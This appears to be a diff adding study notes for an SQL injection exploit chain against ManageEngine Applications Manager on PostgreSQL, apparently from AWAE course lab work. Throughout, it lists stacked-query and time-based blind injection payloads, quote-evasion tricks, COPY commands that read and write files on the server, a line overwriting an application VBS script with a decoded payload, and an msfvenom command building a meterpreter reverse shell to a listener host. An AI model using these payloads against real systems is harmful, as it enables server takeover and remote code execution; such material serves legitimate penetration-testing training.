@@ -1,0 +1,38 @@
+select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT 1
+
+
+select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END
+
+
+amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
+
+CREATE TABLE AWAE (offsec text); INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
+
+CREATE TABLE AWAE (offsec text);
+INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
+COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65)||CHR(87)||CHR(65)||CHR(69));
+
+SELECT 'AWAE';
+SELECT $$AWAE$$;
+SELECT $TAG$AWAE$TAG$;
+
+CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
+COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;
+
+SELECT current_setting('is_superuser');
+
+;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
+
+CREATE temp table awae (content text);
+COPY awae from $$c:\awae.txt$$;
+SELECT content from awae;
+DROP table awae;
+
+;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+ 
+
+COPY (SELECT $$offsec$$) to $$c:\\offsec.txt$$;
+
+copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
+
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
+
